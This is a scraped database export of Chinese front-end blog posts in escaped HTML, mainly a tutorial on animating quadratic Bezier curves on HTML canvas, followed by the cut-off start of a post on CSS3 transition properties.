class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003edraw curve\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ecanvas\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"canvas\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"800\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"800\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ecanvas\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e canvas = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById( \u003cspan class=\"hljs-string\"\u003e'canvas'\u003c/span\u003e );\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ctx = canvas.getContext( \u003cspan class=\"hljs-string\"\u003e'2d'\u003c/span\u003e );\n            \n            ctx.lineWidth = \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n            ctx.strokeStyle = \u003cspan class=\"hljs-string\"\u003e'#ff0000'\u003c/span\u003e;\n            ctx.beginPath();\n    \n            drawCurvePath( \n                ctx,\n                [ \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e ],\n                [ \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e ],\n                \u003cspan class=\"hljs-number\"\u003e0.2\u003c/span\u003e\n            );\n            \n            ctx.stroke();\n            \n            \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness \u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n            }\n        \u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e绘制贝塞尔曲线动画\u003c/h2\u003e\n\u003cp\u003e终于来到文章的本体啦，我们的目的不是绘制一条静态的曲线，我们想绘制一条有过渡效果的曲线。\u003c/p\u003e\n\u003cp\u003e简化一下问题，那就是我们希望绘制曲线的函数还接受另一个参数，表示绘制曲线的百分比。我们定时去调用这个函数，递增百分比这个参数，就能画出动画了。\u003c/p\u003e\n\u003cp\u003e我们新增一个参数\u003ccode\u003epercent\u003c/code\u003e来表示百分比，现在函数变成了这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制一条曲线路径\n * @param  {Object} ctx canvas渲染上下文\n * @param  {Array\u0026lt;number\u0026gt;} start 起点\n * @param  {Array\u0026lt;number\u0026gt;} end 终点\n * @param  {number} curveness 曲度(0-1)\n * @param  {number} percent 绘制百分比(0-100)\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness, percent \u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是canvas提供的\u003ccode\u003equadraticCurveTo\u003c/code\u003e方法只能绘制一条完整的二次贝赛尔曲线，没有办法去控制它只画一部分。\u003c/p\u003e\n\u003cp\u003e画完后用\u003ccode\u003eclearRect\u003c/code\u003e擦除掉一部分？这不太可行，因为很难确定要擦除的范围。如果曲线的线宽比较宽，就还需要保证擦除的边界和曲线末端垂直，问题就变得很复杂了。\u003c/p\u003e\n\u003cp\u003e现在再重新看看这张图\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"s\" src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e1929786355b?w=240\u0026amp;h=100\u0026amp;f=gif\u0026amp;s=74274\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我们是不是可以将\u003ccode\u003epercent\u003c/code\u003e这个参数理解成\u003ccode\u003et\u003c/code\u003e值，然后通过贝赛尔曲线方程去计算出中间所有的点，用直线连接起来，以此模拟绘制贝赛尔曲线的一部分呢？\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e方法一\u003c/h3\u003e\n\u003cp\u003e我们不再用canvas提供的\u003ccode\u003equadraticCurveTo\u003c/code\u003e来绘制曲线，而是通过贝赛尔曲线的方程计算出一系列点，用多段直线来模拟曲线。\u003c/p\u003e\n\u003cp\u003e这样做的好处是，我们可以很容易的控制绘制的范围。\u003c/p\u003e\n\u003cp\u003e那么函数实现就变成了这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制一条曲线路径\n * @param  {Object} ctx canvas渲染上下文\n * @param  {Array\u0026lt;number\u0026gt;} start 起点\n * @param  {Array\u0026lt;number\u0026gt;} end 终点\n * @param  {number} curveness 曲度(0-1)\n * @param  {number} percent 绘制百分比(0-100)\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness, percent \u003c/span\u003e) \u003c/span\u003e{\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cp = [\n         ( start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] + end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ) / \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - ( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] - end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ) * curveness,\n         ( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] + end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ) / \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - ( end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] - start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ) * curveness\n    ];\n    \n    ctx.moveTo( start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] );\n    \n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ( \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e t = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; t \u0026lt;= percent / \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e; t += \u003cspan class=\"hljs-number\"\u003e0.01\u003c/span\u003e ) {\n\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e x = quadraticBezier( start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], cp[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], t );\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e y = quadraticBezier( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ], cp[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ], end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ], t );\n        \n        ctx.lineTo( x, y );\n    }\n    \n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003equadraticBezier\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e p0, p1, p2, t \u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e k = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - t;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e k * k * p0 + \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e * ( \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - t ) * t * p1 + t * t * p2;    \u003cspan class=\"hljs-comment\"\u003e// 这个方程就是二次贝赛尔曲线方程\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来就可以通过设置定时器，每隔一段时间调用一次这个方法，并且递增percent\u003c/p\u003e\n\u003cp\u003e为了动画更加平滑，我们使用\u003ccode\u003erequestAnimationFrame\u003c/code\u003e来代替定时器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elang\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003edraw curve\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ecanvas\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"canvas\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"800\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"800\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ecanvas\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e canvas = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById( \u003cspan class=\"hljs-string\"\u003e'canvas'\u003c/span\u003e );\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ctx = canvas.getContext( \u003cspan class=\"hljs-string\"\u003e'2d'\u003c/span\u003e );\n            \n            ctx.lineWidth = \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n            ctx.strokeStyle = \u003cspan class=\"hljs-string\"\u003e'#000'\u003c/span\u003e;\n            \n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e percent = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n            \n            \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eanimate\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \n                ctx.clearRect( \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e800\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e800\u003c/span\u003e );\n                ctx.beginPath();\n\n                drawCurvePath( \n                    ctx,\n                    [ \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e ],\n                    [ \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e ],\n                    \u003cspan class=\"hljs-number\"\u003e0.2\u003c/span\u003e,\n                    percent\n                );\n    \n                ctx.stroke();\n    \n                percent = ( percent + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ) % \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e;\n                \n                requestAnimationFrame( animate );\n                \n            }\n            \n            animate();\n            \n            \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness, percent \u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n            }\n        \u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e得到的结果：\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/160935c22ae1e69a?w=305\u0026amp;h=269\u0026amp;f=gif\u0026amp;s=27239\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003e这样基本实现了我们的需求，但它有一个问题：\u003c/p\u003e\n\u003cp\u003e测试发现，进行一次\u003ccode\u003elineTo\u003c/code\u003e的时间和一次\u003ccode\u003equadraticCurveTo\u003c/code\u003e的时间差不多，但是\u003ccode\u003equadraticCurveTo\u003c/code\u003e只需要一次就能画出曲线，而使用\u003ccode\u003elineTo\u003c/code\u003e则需要数十次。\u003c/p\u003e\n\u003cp\u003e换言之，用这样的方式绘制曲线，和我们前面的实现方式相比性能下降了数十倍之多。在绘制一条曲线时可能感觉不到区别，但是如果需要同时绘制上千条曲线，性能就会受到很大的影响。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e方法二\u003c/h3\u003e\n\u003cp\u003e那有没有什么方法可以做到用\u003ccode\u003equadraticCurveTo\u003c/code\u003e来实现绘制完整曲线的一部分呢？\u003c/p\u003e\n\u003cp\u003e我们再次回到这张图\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"s\" src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e1929786355b?w=240\u0026amp;h=100\u0026amp;f=gif\u0026amp;s=74274\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在中间的某一时刻，例如t=0.25时，它是这样的：\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e25792da9c97?w=240\u0026amp;h=100\u0026amp;f=png\u0026amp;s=5429\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003e我们注意到，曲线\u003ccode\u003eP0-B\u003c/code\u003e这一段似乎也是贝赛尔曲线，它的控制点变成了\u003ccode\u003eP0，Q0，B\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e现在问题就迎刃而解了，我们只需要每次计算出\u003ccode\u003eQ0，B\u003c/code\u003e，就能得到其中一小段贝赛尔曲线的控制点，然后就可以通过\u003ccode\u003equadraticCurveTo\u003c/code\u003e来绘制它了。\u003c/p\u003e\n\u003cp\u003e代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制一条曲线路径\n * @param  {Object} ctx canvas渲染上下文\n * @param  {Array\u0026lt;number\u0026gt;} start 起点\n * @param  {Array\u0026lt;number\u0026gt;} end 终点\n * @param  {number} curveness 曲度(0-1)\n * @param  {number} percent 绘制百分比(0-100)\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness, percent \u003c/span\u003e) \u003c/span\u003e{\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cp = [\n         ( start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] + end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ) / \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - ( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] - end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ) * curveness,\n         ( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] + end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ) / \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - ( end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] - start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ) * curveness\n    ];\n    \n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e t = percent / \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e;\n    \n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e p0 = start;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e p1 = cp;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e p2 = end;\n    \n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e v01 = [ p1[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] - p0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], p1[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] - p0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ];     \u003cspan class=\"hljs-comment\"\u003e// 向量\u0026lt;p0, p1\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e v12 = [ p2[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] - p1[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], p2[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] - p1[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ];     \u003cspan class=\"hljs-comment\"\u003e// 向量\u0026lt;p1, p2\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e q0 = [ p0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] + v01[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] * t, p0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] + v01[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] * t ];\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e q1 = [ p1[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] + v12[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] * t, p1[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] + v12[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] * t ];\n    \n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e v = [ q1[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] - q0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], q1[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] - q0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ];       \u003cspan class=\"hljs-comment\"\u003e// 向量\u0026lt;q0, q1\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = [ q0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] + v[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] * t, q0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] + v[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] * t ];\n    \n    ctx.moveTo( p0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], p0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] );\n\n    ctx.quadraticCurveTo( \n        q0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], q0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ],\n        b[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], b[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ]\n    );\n\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将前面写的页面替换成上面的代码，可以看到得到的结果是一样的：\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/160935c22ae1e69a?w=305\u0026amp;h=269\u0026amp;f=gif\u0026amp;s=27239\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003ch3 class=\"heading\"\u003e绘制动画\u003c/h3\u003e\n\u003cp\u003e现在已经解决了最关键的问题，我们可以绘制动画啦。\n不过这一部分并不重要，我就不贴代码了。\u003c/p\u003e\n\u003cp\u003e完整代码可以看\u003ca target=\"_blank\" href=\"https://github.com/hujiulong/blog/blob/master/demo/bezier/index.html\"\u003e这里\u003c/a\u003e\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"160935917f7f0d3f\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160936fc9c5c61ac?w=305\u0026amp;h=269\u0026amp;f=gif\u0026amp;s=473671\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003ch2 class=\"heading\"\u003e结束\u003c/h2\u003e\n\u003cp\u003e这篇博客到这里就结束了，我们讲了canvas如何绘制曲线，以及如何绘制曲线过渡效果。下篇博客我计划写一写如何在canvas中模拟大自然中光源照射在物体表面产生的效果。\u003c/p\u003e\n\u003cp\u003e我的博客地址： \u003ca target=\"_blank\" href=\"https://github.com/hujiulong/blog\"\u003ehttps://github.com/hujiulong/blog\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e我会在这里分享我的学习成果和经验，特别是canvas/WebGL/svg这方面的技术。如果有对前端图形绘制感兴趣的同学可以关注一下我的博客，收藏点star，订阅点watch。\u003c/p\u003e\n\u003cp\u003e最近才将博客搬到github，所以文章并不多，我会坚持写下去的！\u003c/p\u003e\n","buildTime":"1514972956.3163","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac40336a"},"id":"5a424a796fb9a045023be66c","author":{"$oid":"5a4cc38785472a29ac40334c"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/26/16092f2e42bcea2b?w=921\u0026h=532\u0026f=gif\u0026s=8407","https://user-gold-cdn.xitu.io/2017/12/26/16092f2e4576db07?w=921\u0026h=532\u0026f=gif\u0026s=14521"],"screenShot":null}],"title":"CSS3的动画属性","meta":{"likeCount":0},"tag":["CSS","动效","前端","JavaScript"],"comment":[],"shortContent":"transition允许css的属性值在一定的时间区间内平滑地过渡。这种效果可以在鼠标单击、获得焦点、被点击或对元素任何改变中触发，并圆滑地以动画效果改变CSS的属性值。 transition主要包含四个属性值：执行变换的属性：transition-property，变换延续的…","content":"\u003cblockquote\u003e\n\u003cp\u003etransition、animation和transform是CSS3中三个制作动画的重要属性，本篇文章主要对其进行学习了解。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e一、transition\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003etransition\u003c/code\u003e允许css的属性值在一定的时间区间内平滑地\u003cstrong\u003e过渡\u003c/strong\u003e。这种效果可以在鼠标单击、获得焦点、被点击或对元素任何改变中触发，并圆滑地以动画效果改变CSS的属性值。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransition ：transition-property || transition-duration || transition-timing-function || transition-delay;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003etransition\u003c/code\u003e主要包含四个属性值：执行变换的属性：\u003ccode\u003etransition-property\u003c/code\u003e，变换延续的时间：\u003ccode\u003etransition-duration\u003c/code\u003e，在延续时间段，变换的速率变化：\u003ccode\u003etransition-timing-function\u003c/code\u003e，变换延迟时间：\u003ccode\u003etransition-delay\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. transition-property\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransition-property: none || all || property;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003etransition-property\u003c/code\u003e是用来指定当元素其中一个属性改变时执行\u003ccode\u003etransition\u003c/code\u003e效果。\u003c/p\u003e\n\u003cp\u003enone: 没有属性会获得过渡效果；\u003c/p\u003e\n\u003cp\u003eall: 所有属性都将获得过渡效果,\u003cstrong\u003e也是其默认值\u003c/strong\u003e；\u003c/p\u003e\n\u003cp\u003eproperty: 定义应用过渡效果的 CSS 属性名称列表，列表以逗号分隔。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2. transition-duration\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransition-duration: time;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003etransition-duration\u003c/code\u003e是用来指定元素 转换过程的持续时间，取值time为数值，单位为s（秒）或者ms(毫秒)，其默认值是0，也就是变换时是即时的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3. transition-timing-function\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransition-timing-function: linear || ease || ease-in || ease-out || ease-in-out || 